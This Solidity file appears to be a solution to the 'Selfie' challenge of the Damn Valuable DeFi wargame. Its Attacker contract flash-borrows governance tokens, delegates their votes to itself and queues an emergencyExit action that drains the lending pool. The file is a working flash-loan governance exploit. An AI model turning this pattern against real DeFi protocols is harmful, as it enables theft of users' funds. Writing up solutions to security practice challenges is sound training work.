// SPDX-License-Identifier: MIT

pragma solidity =0.8.25;

import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {Test, console} from "forge-std/Test.sol";

contract Attacker {
    DamnValuableVotes token;
    SimpleGovernance governance;
    SelfiePool pool;
    address recovery;

    constructor(DamnValuableVotes _token, SimpleGovernance _governance, SelfiePool _pool, address _recovery) {
        token = _token;
        governance = _governance;
        pool = _pool;
        recovery = _recovery;
    }

    function onFlashLoan(address initiator, address token,
                        uint256 amount, uint256 fee,
                        bytes calldata data
    ) external returns (bytes32) 
    {
        DamnValuableVotes(token).delegate(address(this));
        address target = address(pool);
        uint128 value = 0;
        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", recovery);
        governance.queueAction(target, value, data);
        DamnValuableVotes(token).approve(address(msg.sender), 2**256 - 1); // unlimited approve for pool
        return (keccak256("ERC3156FlashBorrower.onFlashLoan"));
    }

    function preload() public {
        bytes memory data = "";
        uint256 amount = 0xffe33bfeffedf1800001;
        pool.flashLoan(IERC3156FlashBorrower(address(this)), address(token), amount, data);
    }

    function attack() public {
        governance.executeAction(1);
    }
}